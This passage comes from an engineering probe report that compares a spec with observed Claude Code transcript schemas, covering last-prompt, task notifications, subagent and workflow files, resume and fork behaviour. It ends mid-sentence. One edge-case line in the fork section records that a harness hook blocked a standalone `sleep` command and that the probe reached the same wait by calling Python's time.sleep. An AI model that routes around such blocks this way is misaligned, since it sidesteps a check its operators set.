- spec line 724 says "the candidate mechanism is appending an `ai-title` entry". In reality `ai-title` is the engine-generated channel. A user-supplied name in Claude Code is `custom-title` (`--name` writes it, and the registry then reports `nameSource:"user"`). The `/rename` sidecar is also `custom-title.json`. The binary's merge table gives each type its own `last-wins` policy (`docs/probes/2026-09-14-schemas/transcripts/captures/binary-metadata-table.txt`). It does not show which of the two wins when both exist, and no write-back was attempted. Appending `ai-title` would therefore at best record a user title in the engine-title channel, and it may be hidden by an existing `custom-title`. The candidate mechanism targets the wrong entry type.

### `last-prompt` entry

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §7 `session.brief` for attached sessions (line 664), Appendix A (line 2446), M1
- **Probe:** `probe_lifecycle.sh longprompt resume`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh longprompt`
- **Status:** verified live 2026-09-14

**Real example** (full captures: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/6fcb72cd-b6f3-4acd-a43d-6c7e3e89bd28.jsonl` line 15; `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` lines 37 and 45)
```json
{"type":"last-prompt","lastPrompt":"Line one of a deliberately long probe prompt. Line two continues so that the prompt is well over two hundred characters long, which lets us see whether last-prompt truncates it and what happens to new…","leafUuid":"57a7dd84-7465-4259-99c7-26e6a45ca551","sessionId":"6fcb72cd-b6f3-4acd-a43d-6c7e3e89bd28"}
{"type":"last-prompt","lastPrompt":"Step 1: use the Agent tool (subagent_type general-purpose, description 'probe ch...","leafUuid":"bd49cc8c-e6db-498c-b676-c0a47e892433","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d"}
{"type":"last-prompt","lastPrompt":"Reply with exactly RESUMED.","leafUuid":"a0f601a0-f071-4fc6-b3fa-969600f80e5c","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d"}
```
Input (`docs/probes/2026-09-14-schemas/transcripts/captures/longprompt-input.txt`): 269 chars with 2 newlines.

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `lastPrompt` | string | sometimes (440/443 user; 206/208 probe dirs) | length ≤ 201. Truncated as the first 200 chars + `…` (U+2026). User data: 160 values are longer than 200 chars (max 201) and 188 end with `…` | **Newlines are flattened to spaces**. The probe value equals the input's first 200 chars with `\n`→space, plus `…` |
| `leafUuid` | string | always | uuid of the conversation leaf at write time | |

**Variants and edge cases:**
- The value is the **latest human or SDK prompt**. After `--resume … "Reply with exactly RESUMED."` it became `Reply with exactly RESUMED.`. A queued `<task-notification>` prompt did **not** replace it (line 37 still shows the original prompt).
- `last-prompt` without a `lastPrompt` field was observed 3× (user) and 2× (probe dirs).
- **In a `-p` fork it is stale.** Fork `7c27bb7f…` (argv `-p "Reply with exactly FORKED." --resume 0141fab3… --fork-session`) wrote its own `last-prompt` entries at lines 37 and 44, whose `leafUuid`s point at the fork's new entries. Both carry `lastPrompt` = the history's **first** prompt ("Step 1: use the Agent tool…"). They carry neither the fork's own prompt nor the target's then-latest "Reply with exactly RESUMED." (`docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/7c27bb7f-5390-48b0-8b2e-cf4004113d09.jsonl`, `docs/probes/2026-09-14-schemas/transcripts/captures/fork-meta.txt`). A `/compact` local command did not replace it either (`0141fab3…` line 62 still says RESUMED).

**Spec alignment:** spec line 664 and line 2446 say `brief` for attached sessions is "the transcript's `lastPrompt`". In reality `lastPrompt` is the most recent prompt, not the task the session was started with. It is cut to 200 chars + "…" and its newlines become spaces (`docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/6fcb72cd-b6f3-4acd-a43d-6c7e3e89bd28.jsonl`). A faithful brief needs the first `user` entry with `origin.kind` in {human, absent} and string content, or the `UserPromptSubmit.prompt` hook field.

### `queue-operation` and task-notification entries

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §12 subagent state (line 1870), §8 `SubagentStop`/`active_subagents`, M1
- **Probe:** `probe_lifecycle.sh main bg`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh bg`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` lines 1, 2, 28)
```json
{"type":"queue-operation","operation":"enqueue","timestamp":"2026-09-14T15:07:07.509Z","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","content":"Step 1: use the Agent tool (subagent_type general-purpose, description..."}
{"type":"queue-operation","operation":"dequeue","timestamp":"2026-09-14T15:07:07.511Z","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d"}
{"type":"queue-operation","operation":"enqueue","timestamp":"2026-09-14T15:07:13.811Z","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","content":"<task-notification>\n<task-id>a4388d337bf8a9397</task-id>\n<tool-use-id>toolu_01AjU2TvSydb1THCnRCcYCLQ</tool-use-id>\n<output-file>/tmp/claude-0/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d/tasks/a4388d337bf8a9397.output</output-file>\n<status>completed</status>\n<summary>Agent \"probe child\" finished</summary>\n<note>A task-notification fires each time this agent stops with no live background children of its own. The user can send it another message and resume it, so the same task-id may notify more than once.</note>\n<result>PONG</result>\n<usage><subagent_tokens>115..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `operation` | string | always | `enqueue` 232, `dequeue` 213, `remove` 16, `popAll` 1 (user) | |
| `content` | string | sometimes (on enqueue) | prompt text, or `<task-notification>` XML (36 user, 5 probe) | |
| `reason` | string | sometimes (8 user) | `<redacted>` | |
| task-notification XML tags | text | — | `task-id`, `tool-use-id`, `output-file`, `status` (`completed`), `summary`, `note`, `result`, `usage` | `tool-use-id` equals meta.json `toolUseId` |

**Variants and edge cases:**
- In `-p`, an Agent call without `run_in_background` was still **started in the background** (`result.subagent_stats.requested.unset=1, started_in_background=1`, `docs/probes/2026-09-14-schemas/transcripts/captures/main-stdout.jsonl`). Its completion arrived only as a task-notification, **never as a `tool_result`**.
- The note says the same task-id "may notify more than once".
- A notification is also delivered as a `user` entry with `origin.kind:"task-notification"` (see `user`).
- The `-p` stream-json output adds `system/task_started`, `task_updated` (`patch.status:"completed"`) and `task_notification` events that are not in the transcript (`docs/probes/2026-09-14-schemas/transcripts/captures/bg-stdout.jsonl`).

**Spec alignment:** spec line 1870 says each subagent line shows "type, description, elapsed, state", and line 609 says the list is read from the transcript. Agent-tool state is readable from the transcript only as free text. No structured field in the subagent `.jsonl` or `.meta.json` records it. It has to be parsed from the `<status>` tag of a `<task-notification>` (queue-operation `content` or `user` entry), taken from a `tool_result` for `toolUseId` (foreground only), or read from `journal.jsonl` / `wf_<runId>.json` for workflow agents (`docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` line 28). The `SubagentStop` hook's `background_tasks[]` still lists the stopping agent itself as `status:"running"` (`docs/probes/2026-09-14-schemas/transcripts/captures/hooks-lifecycle.jsonl` lines 7, 29, 51), so that field is no substitute either.

### Subagent transcript and `.meta.json` (Agent tool)

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §7 "subagent rows" (line 609), §12 subagent lines (line 1870), `list_subagents` (§11), M1
- **Probe:** `probe_lifecycle.sh main bg`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh main bg`
- **Status:** verified live 2026-09-14

**Real example** (full captures: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/7515f181-14c5-4540-9107-4f1d1267cf83/subagents/agent-a1a6271c8023a6c65.meta.json`; trimmed first line of `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d/subagents/agent-a4388d337bf8a9397.jsonl`)
```json
{"agentType":"general-purpose","description":"probe bg child","toolUseId":"toolu_01KeyyCiTPjwVZLFwG6wEwnp","spawnDepth":1,"requestShape":"background","requestNonInteractive":true}
{"parentUuid":null,"isSidechain":true,"promptId":"b842cda1-7298-40d9-87a4-1966249ed00c","agentId":"a4388d337bf8a9397","type":"user","message":{"role":"user","content":"Reply with exactly the word PONG and nothing else."},"uuid":"dd540906-96b9-4e47-be0b-8bb9ce513cda","timestamp":"2026-09-14T15:07:12.183Z","userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","version":"2.1.270","gitBranch":"HEAD"}
```

| Field (meta.json) | Type | Presence (n=26 user + 7 probe) | Observed values | Notes |
|---|---|---|---|---|
| `agentType` | string | always | `general-purpose`, plugin types (`<plugin>:<name>`), `workflow-subagent` | |
| `description` | string | always | Agent `description`, or the workflow `label` | |
| `toolUseId` | string | sometimes (Agent tool only: 9/9 user, 6/6 probe) | `toolu_…` | Absent on workflow agents |
| `spawnDepth` | number | always | 1, 2 | |
| `parentAgentId` | string | sometimes (3, depth-2 agents) | agentId | |
| `requestShape` | string | always | `background` 8 user / 4 probe; `foreground` 18 user / 3 probe | Our "no run_in_background" call was stored as `background` |
| `requestNonInteractive` | bool | always | true (Agent), false (user workflow agents), true (probe `-p` workflow agent) | |
| `model` | string | sometimes (6 user) | `opus`, `sonnet` | Alias, not a full id. Absent when inherited |
| `workflowPhase` | string | sometimes (workflow agents) | `Ping` (probe) | |

Subagent `.jsonl` entries: every entry has `isSidechain:true`, `agentId`, and the **parent's** `sessionId`. Assistant entries add `attributionAgent`. The first entry is a `user` entry with the prompt and a `timestamp`.

**Variants and edge cases:** an agent transcript file for the internal compaction agent was announced by SubagentStop but never written (see layout).

**Spec alignment:** aligned with line 609 ("read from the transcript on demand"): `agentType`, `description` and start/last `timestamp` exist. For state, see the queue-operation section.

### Workflow subagents: `journal.jsonl`, `workflows/wf_<runId>.json`, script

- **Produced by:** Claude Code 2.1.270 (Workflow tool)
- **Consumed by:** §12 subagent lines (line 1870), §7 subagent rows (line 609), M1
- **Probe:** `probe_lifecycle.sh workflow`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh workflow`
- **Status:** verified live 2026-09-14

**Real example** (full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/518c280f-3791-4571-ae9a-f002c8f3b33c/subagents/workflows/wf_edb19b07-a69/journal.jsonl` and `.../agent-aff491fda998b3fe0.meta.json`; trimmed `.../518c280f-3791-4571-ae9a-f002c8f3b33c/workflows/wf_edb19b07-a69.json`)
```json
{"type":"launched"}
{"type":"started","key":"v2:790ace0b7a70b7ce22b41ec6c8a1903b01ee817a5738b79071f6aafe00f92aef","agentId":"aff491fda998b3fe0","label":"ping","phase":"Ping"}
{"type":"result","key":"v2:790ace0b7a70b7ce22b41ec6c8a1903b01ee817a5738b79071f6aafe00f92aef","agentId":"aff491fda998b3fe0","result":"PONG"}
{"agentType":"workflow-subagent","description":"ping","workflowPhase":"Ping","spawnDepth":1,"requestShape":"foreground","requestNonInteractive":true}
{"runId":"wf_edb19b07-a69","timestamp":"2026-09-14T15:09:58.745Z","taskId":"w1x94eiqe","script":"export const meta = { name: 'shp-probe-wf', description: 'sc...","scriptPath":"/root/.claude/projects/-tmp-shp-schemas-tx-blIf90-work/518c2...","result":"PONG","agentCount":1,"logs":[],"durationMs":1530,"summary":"schema probe","workflowName":"shp-probe-wf","status":"completed","startTime":1789398597206,"phases":[{"title":"Ping"}],"defaultModel":"claude-haiku-4-5-20251001","workflowProgress":[{"type":"workflow_phase","index":1,"title":"Ping"},{"type":"workflow_agent","index":1,"label":"ping","phaseIndex":1,"phaseTitle":"Ping","agentId":"aff491fda998b3fe0","model":"claude-haiku-4-5-20251001","state":"done","startedAt":1789398597241,"queuedAt":1789398597235,"attempt":1,"promptPreview":"Reply with exactly the word PONG.","promptFramed":false,"lastProgressAt":1789398598743,"tokens":10077,"toolCalls":0,"durationMs":1502,"resultPreview":"PONG"}],"totalTokens":10077,"totalToolCalls":0}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| journal `type` | string | always | `launched` (first line, no other fields), `started`, `result` | user data: 2 launched, 17 started, 15 result (a running workflow has started entries without results) |
| journal `key` | string | on started/result | `v2:<sha256>` | Resume cache key |
| journal `agentId`, `label`, `phase` | string | on started | | `label` = meta `description` |
| journal `result` | any | on result | string, or an object when a schema is used | Can carry the full agent output |
| `wf_<runId>.json` | object | after completion (1/2 user runs) | `status: completed`; `workflowProgress[].state: done` | Per-agent `state`, `model`, `tokens`, `durationMs`. User file also has `args` |
| workflow `toolUseResult` (parent `user` entry) | object | always | `{status:"async_launched",taskId,taskType:"local_workflow",workflowName,runId,summary,transcriptDir,scriptPath}` | Links the parent transcript to the run dir |

**Variants and edge cases:** SubagentStop for a workflow agent carries `agent_type:"workflow-subagent"` and `background_tasks[{type:"workflow",name}]` (`docs/probes/2026-09-14-schemas/transcripts/captures/hooks-lifecycle.jsonl`). `wf_<runId>.json` does not exist while the run is in flight (a live user run had only the journal).

**Spec alignment:** the spec does not cover workflow agents. They are not under `subagents/agent-*.jsonl`, have no `toolUseId`, and have the fixed `agentType:"workflow-subagent"`. Their state is readable from `journal.jsonl` (started without result = running) or from `wf_<runId>.json` `workflowProgress[].state`.

### Other metadata entries (`mode`, `permission-mode`, `atis-latch`, `bridge-session`, `cost-state`, `file-history-*`, `frame-link`, `artifact-*`, `pr-link`)

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §7 `pr_url` (line 681), §8 needs-you (permission mode), M1/M2
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_registry_interactive.sh` (interactive entries) and `docs/probes/2026-09-14-schemas/transcripts/probe_binary_metadata.sh` (static, pr-link). Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_registry_interactive.sh && bash docs/probes/2026-09-14-schemas/transcripts/probe_binary_metadata.sh`
- **Status:** partially verified. `mode`, `permission-mode`, `atis-latch`, `bridge-session`, `cost-state` and `file-history-snapshot` were verified live 2026-09-14. Counted in user data only for `file-history-delta`, `frame-link` and `artifact-*`. **`pr-link` is not verifiable here**: no probe or user session created a PR, so the only evidence is static.

**Real example** (full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-regint-KD6xG3-work/2efd1f5f-1b93-481a-8469-0f589a48d7ae.jsonl` lines 2, 3, 5, 6, 42; privacy-redacted UUIDs)
```json
{"type":"mode","mode":"normal","sessionId":"2efd1f5f-1b93-481a-8469-0f589a48d7ae"}
{"type":"permission-mode","permissionMode":"default","sessionId":"2efd1f5f-1b93-481a-8469-0f589a48d7ae"}
{"type":"bridge-session","sessionId":"2efd1f5f-1b93-481a-8469-0f589a48d7ae","bridgeSessionId":"cse_01RmL9HDvfCZ5Wrrfpr2mM4x","lastSequenceNum":0,"ownerAccountUuid":"<redacted-uuid>","ownerOrganizationUuid":"<redacted-uuid>"}
{"type":"file-history-snapshot","messageId":"4c6578ff-280f-4929-8baa-c99461b6f5f5","snapshot":{"messageId":"4c6578ff-280f-4929-8baa-c99461b6f5f5","trackedFileBackups":{},"timestamp":"2026-09-14T15:16:17.588Z"},"isSnapshotUpdate":false}
{"type":"cost-state","sessionId":"2efd1f5f-1b93-481a-8469-0f589a48d7ae","totalCostUSD":0.031924600000000004,"totalAPIDuration":7914,"totalAPIDurationWithoutRetries":7896,"totalToolDuration":20106,"totalLinesAdded":0,"totalLinesRemoved":0,"totalDuration":50401,"startTime":1789398960924,"modelUsage":{"claude-haiku-4-5-20251001":{"inputTokens":368,"outputTokens":516,"thinkingTokens":426,"cacheReadInputTokens":106786,"cacheCreationInputTokens":9149,"webSearchRequests":0,"costUSD":0.031924600000000004}},"hasUnknownModelCost":false}
```
Static evidence for `pr-link` (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/captures/binary-metadata-table.txt`, from `docs/probes/2026-09-14-schemas/transcripts/probe_binary_metadata.sh`, a grep of the 2.1.270 binary):
```text
claude_version: 2.1.270 (Claude Code)
binary: /root/.local/share/claude/versions/2.1.270
...
# pr-link writer
ber!==void 0&&this.currentSessionPrUrl&&this.currentSessionPrRepository)P.push({type:"pr-link",sessionId:d,prNumber:this.currentSessionPrNumber,prUrl:this.currentSessionPrUrl,prRepository:this.currentSessionPrRepository,timestamp:new Date().toISOString()});...
leChanged.emit()}async function _Dr(e,n,r,s,d,m){let _=d??hf(e);try{await pA(_,{type:"pr-link",sessionId:e,prNumber:n,prUrl:r,prRepository:s,timestamp:new Date().toISOString()},m),i("tengu_session_linked_to_pr",{prNumber:n})}catch(E){let A=k(E);if(Fo(E))t(`linkSessionToPR: failed to append pr-link entry to ${_} (...
```

| Type | Fields | Presence | Observed values | Notes |
|---|---|---|---|---|
| `mode` | `mode` | always (interactive), sometimes (`-p` after resume) | `normal` 425 | |
| `permission-mode` | `permissionMode` | written by interactive sessions (also copied into a `-p` fork of one) | `auto` 412, `default` 7, `acceptEdits` 6 (user) | Live permission mode |
| `atis-latch` | `atis` | always | `""` | Meaning unknown |
| `bridge-session` | `bridgeSessionId`, `lastSequenceNum`, `ownerAccountUuid`, `ownerOrganizationUuid` | Remote Control sessions (406 user; 142 carry owner UUIDs) | `cse_…` | The same suffix appears as `session_…` in the registry `bridgeSessionId` |
| `cost-state` | `totalCostUSD`, `totalAPIDuration`, `totalDuration`, `modelUsage{<model>:{…}}`, … | interactive, at exit (7 user) | | Written at session end |
| `file-history-snapshot` | `messageId`, `snapshot{messageId,trackedFileBackups,timestamp}`, `isSnapshotUpdate` | interactive only (217 user; 0 in `-p` probes, even after a Write) | | No `sessionId` |
| `file-history-delta` | `backup`, `messageId`, `snapshotMessageId`, `timestamp`, `trackingPath` | sometimes (49 user) | | No `sessionId` |
| `frame-link` | `artifactCount`, `timestamp`; sometimes `frameUrl`, `path`, `title` | 55 user | | |
| `artifact-autoreact-ledger` / `artifact-comment-monitor` | `v`, `artifacts`, `accountUuid` (ledger) | 14 / 4 user | | Contains accountUuid |
| `pr-link` | `sessionId`, `prNumber`, `prUrl`, `prRepository`, `timestamp` (static) | **never observed** (0 user, 0 probe) | — | Emitted only when the session tracked a PR |

**Variants and edge cases:** `permission-mode` is written only by interactive sessions. A `-p` session's mode is visible only on `user.permissionMode`.

**Spec alignment:** spec line 681 says `pr_url` is "free — the transcript emits `pr-link` entries". That is unverified: 0 `pr-link` entries in 14 user transcripts and in every probe. The binary writes `{type:"pr-link",sessionId,prNumber,prUrl,prRepository,timestamp}` only when `currentSessionPrNumber`, `currentSessionPrUrl` and `currentSessionPrRepository` are all set, or from `linkSessionToPR` (`docs/probes/2026-09-14-schemas/transcripts/captures/binary-metadata-table.txt`). Until a PR-creating session is probed, `pr_url` should be treated as possibly always null.

### Resume (`--resume <id>`)

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §6 matrix "steer / resume" (line 548), `MasterRuntime.resume` (§6), D10/D30, M3/M4
- **Probe:** `probe_lifecycle.sh resume`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh main resume`
- **Status:** verified live 2026-09-14 (`-p` resume of a stopped session)

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/transcripts/captures/resume-filecheck.txt`, `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` line 45)
```text
file: /root/.claude/projects/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl
lines_before: 38
lines_after: 47
files_named_id: 1
```
```json
{"type":"last-prompt","lastPrompt":"Reply with exactly RESUMED.","leafUuid":"a0f601a0-f071-4fc6-b3fa-969600f80e5c","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d"}
```

| Observation | Value | Evidence |
|---|---|---|
| sessionId kept | yes: `result.session_id` = original id | `docs/probes/2026-09-14-schemas/transcripts/captures/resume-stdout.jsonl` |
| same file appended | yes (38 → 47 lines), no new file | `docs/probes/2026-09-14-schemas/transcripts/captures/resume-filecheck.txt` |
| hook `SessionStart.source` | `resume` (+ `seconds_since_last_response`, `context_tokens`, `prompt_cache_likely_expired`, `estimated_cache_write_usd`) | `docs/probes/2026-09-14-schemas/transcripts/captures/hooks-lifecycle.jsonl` |
| new metadata entries | `mode`, `queue-operation`, re-appended `ai-title` / `last-prompt` | outline of the copy |

**Variants and edge cases:** `--session-id <uuid>` on a new session sets the id, the transcript file name and the hook `session_id` before the process emits anything (steps `main`, `named`, `bg`, `effort`).

**Spec alignment:** aligned. Note that spec line 652 says `engine_session_id` is "Null until the engine emits it". For owned sessions, `--session-id` can make it known at spawn. That is not a contradiction, but it is an option the spec does not use.

### Fork (`--resume <id> --fork-session`) — the basis of `ask()`

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §9 `ask()` (lines 1197–1217), D13, `EngineCapabilities.can_fork` (line 495), engine matrix "fork: yes" (line 551), §18 fork risk (line 2326), M3
- **Probe:** `probe_lifecycle.sh fork` (stopped target) and `docs/probes/2026-09-14-schemas/transcripts/probe_fork_live.sh` (target is a live interactive tmux session **mid-tool-call**). Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_fork_live.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/transcripts/captures/forklive-meta.txt`, `docs/probes/2026-09-14-schemas/transcripts/captures/forklive-fork-stdout.json`, `docs/probes/2026-09-14-schemas/transcripts/captures/hooks-lifecycle.jsonl` line 16, `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-fork-RgNHRN-work/76d51cc7-3b32-4274-9ee4-e08f21f79042.jsonl` line 25)
```text
claude_version: 2.1.270 (Claude Code)
target_file: /root/.claude/projects/-tmp-shp-schemas-fork-RgNHRN-work/de7c8ce7-f01c-4dcb-8219-b3d3d8b46178.jsonl
target_lines_before_fork: 37
fork_exit: 0
target_lines_right_after_fork: 37
fork_session_id: 76d51cc7-3b32-4274-9ee4-e08f21f79042
target_lines_after_target_turn: 42
...
target_entries_mentioning_fork_id: 0
target_entries_with_fork_question: 0
fork_sessionId_values: ['76d51cc7-3b32-4274-9ee4-e08f21f79042']
fork_uuids_total: 30 shared_with_target: 19
fork_contains_target_turn2_prompt: True
```
```json
{"event_arg": "SessionStart", "captured_at": "2026-09-14T15:08:05.812927+00:00", "claude_version": "2.1.270 (Claude Code)", "ancestry": [...], "raw_stdin": "{\"session_id\":\"7c27bb7f-5390-48b0-8b2e-cf4004113d09\",\"transcript_path\":\"/root/.claude/projects/-tmp-shp-schemas-tx-blIf90-work/7c27bb7f-5390-48b0-8b2e-cf4004113d09.jsonl\",\"cwd\":\"/tmp/shp-schemas-tx.blIf90/work\",\"hook_event_name\":\"SessionStart\",\"source\":\"fork\",\"seconds_since_last_response\":2,\"context_tokens\":23008,\"prompt_cache_likely_expired\":false,\"estimated_cache_write..."}
{"parentUuid":"6d232855-d22b-4f36-a839-a1f541363810","isSidechain":false,"promptId":"032c2faa-6baf-49a3-af8b-2cadabf82c59","type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"[Request interrupted by user for tool use]","is_error":true,"tool_use_id":"toolu_01Te4G4F86V1UF8hZrZz6gu5"}]},"uuid":"f0eea781-a211-4c17-803d-dac89fb21ca8","timestamp":"2026-09-14T15:22:42.306Z","toolUseResult":"[Request interrupted by user for tool use]","toolDenialKind":"interrupted","sourceToolAssistantUUID":"6d232855-d22b-4f36-a839-a1f541363810","userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-fork.RgNHRN/work","sessionId":"76d51cc7-3b32-4274-9ee4-e08f21f79042","version":"2.1.270","gitBranch":"HEAD"}
```
The fork's answer (`docs/probes/2026-09-14-schemas/transcripts/captures/forklive-fork-stdout.json` `.result`) was `PINEAPPLE-42`, the codeword given to the target in an earlier turn.

| Observation | Value | Evidence |
|---|---|---|
| new session id | yes, generated by the engine and reported in `result.session_id` | `docs/probes/2026-09-14-schemas/transcripts/captures/fork-session-id.txt`, `docs/probes/2026-09-14-schemas/transcripts/captures/forklive-meta.txt` |
| new file | `<slug>/<newId>.jsonl` in the same project dir. The source file is unchanged (47 → 47 stopped; 37 → 37 live) | `docs/probes/2026-09-14-schemas/transcripts/captures/fork-filecheck.txt` |
| history copied | the conversation entries are copied with **`uuid` preserved**, **`sessionId` rewritten** to the new id, and **`entrypoint` rewritten** (`cli` → `sdk-cli` when an interactive target is forked with `-p`). There is no `forkedFrom` field. In the stopped-target fork, 30 of the fork's 35 uuids also occur in the source | `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/7c27bb7f-5390-48b0-8b2e-cf4004113d09.jsonl`, `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-fork-*` |
| not copied | the `subagents/` dir (no `7c27bb7f…/` directory in the layout listing). The source's `queue-operation` and `last-prompt` entries are not copied; the fork writes its own, and its `last-prompt` value is stale (see `last-prompt`) | `docs/probes/2026-09-14-schemas/transcripts/captures/layout-listing.txt`, fork copy lines 3–4, 37, 44 |
| hook | `SessionStart.source = "fork"` | `docs/probes/2026-09-14-schemas/transcripts/captures/hooks-lifecycle.jsonl` |
| fork of a live, mid-tool-call target | the fork answered from context. The target got **0** fork entries and finished its own turn afterwards (37 → 42). The fork synthesizes, for the in-flight `tool_use`: `tool_result` "[Request interrupted by user for tool use]" (`toolDenialKind:"interrupted"`), an `isMeta` user "Continue from where you left off.", and a `<synthetic>` assistant "No response requested." | `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-fork-RgNHRN-work/76d51cc7-3b32-4274-9ee4-e08f21f79042.jsonl` lines 25–27 |
| registry | **not captured**. No registry or `claude agents --json` snapshot was taken while a fork ran. Absence is only expected by analogy to the `-p` negative, which is itself inconclusive (see registry) | — |

**Variants and edge cases:**
- A fork of an idle live session (first live run, `docs/probes/2026-09-14-schemas/transcripts/captures/forklive-run1-idle/`) also answered correctly and left the target untouched.
- A fork leaves a permanent transcript file in the target's project dir. `ask()` must delete it or filter it, or else attached-session discovery that globs `*.jsonl` will list it.
- The environment blocked a bare `sleep 45` Bash call ("Blocked: standalone sleep"), which is why the live probe uses `python3 -c "import time; time.sleep(45)"`.

**Spec alignment:**
- spec line 1204–1205 says "the `SessionStart` hook's `start_reason` enum includes `fork`". The field is named **`source`** (`"source":"fork"`, `docs/probes/2026-09-14-schemas/transcripts/captures/hooks-lifecycle.jsonl` line 16).
- Otherwise aligned with D13. The target is never interrupted or polluted, even mid-turn. Line 551 "fork: yes" holds.

**Appended 2026-09-17 (M3 Task 1 / P2) — the `-p --output-format json` result object, at engine 2.1.274.**
K1: the field table lives in this document, not only in a capture folder. Captured on four runs in
`docs/probes/2026-09-17-m3-tmux/p2-fork-20260917T110431Z/` — a base `-p` session and three
`--resume <id> --fork-session` forks. Shape extracted to
`docs/probes/2026-09-17-m3-tmux/p2-fork-20260917T110431Z/05-result-object-shape.json`; the raw
stdout of the fork the examples come from is
`docs/probes/2026-09-17-m3-tmux/p2-fork-20260917T110431Z/02-fork-with-session-id.stdout.json`.

| Field | Type | Observed example | Notes |
|---|---|---|---|
| `api_error_status` | null | `null` | null on all four runs |
| `duration_api_ms` | number | `1516` |  |
| `duration_ms` | number | `1676` |  |
| `fast_mode_disabled_reason` | string | `sdk_opt_in_required` |  |
| `fast_mode_state` | string | `off` |  |
| `first_content_frame_ms` | number | `1167` |  |
| `is_error` | bool | `false` | false on all four runs |
| `modelUsage` | object | (object) | keyed by model id |
| `num_turns` | number | `1` |  |
| `permission_denials` | array | (array) | empty array on all four runs |
| `queued_turn_count` | number | `0` |  |
| `result` | string | `PINEAPPLE-M3` | the assistant's final text |
| `result_index` | number | `0` |  |
| `session_id` | string | `356b6e66-635e-424c-80fd-fef653880906` | **the fork's own id.** When `--session-id <uuid>` is passed it is exactly that uuid; otherwise the engine generates one. This is the field DP7's fallback reads |
| `stop_reason` | string | `end_turn` |  |
| `subagent_stats` | object | (object) |  |
| `subtype` | string | `success` | `success` on all four runs |
| `terminal_reason` | string | `completed` |  |
| `time_to_request_ms` | number | `144` |  |
| `total_cost_usd` | number | `0.0033510000000000002` |  |
| `ttft_ms` | number | `1567` |  |
| `ttft_stream_ms` | number | `1166` |  |
| `type` | string | `result` | always `result` |
| `usage` | object | (object) | token counters |
| `uuid` | string | `2d8ca429-87cc-4ae5-bb30-364acf434605` | per-result id, distinct from `session_id` |

**`--session-id` with `--fork-session`:** accepted (`rc=0`, empty stderr), and `session_id` comes
back as the requested uuid — `docs/probes/2026-09-17-m3-tmux/p2-fork-20260917T110431Z/02-fork-with-session-id.argv.txt`,
`…/02-fork-with-session-id.stdout.json`.

**`--no-session-persistence` changes the residue answer above.** The "A fork leaves a permanent
transcript file" line in Variants was captured *without* that flag and still holds without it. With
`--resume <id> --fork-session --no-session-persistence` under `-p`, **no fork transcript is left**
in the target's project dir, with or without `--session-id`
(`docs/probes/2026-09-17-m3-tmux/p2-fork-20260917T110431Z/03-project-listing.txt`,
`…/04-project-listing.txt`). See BLOCKER-T1-2 in `docs/plans/2026-09-17-m3-BLOCKERS.md`.

**Still `unknown`:** forking a **live interactive** target while passing `--session-id`. The
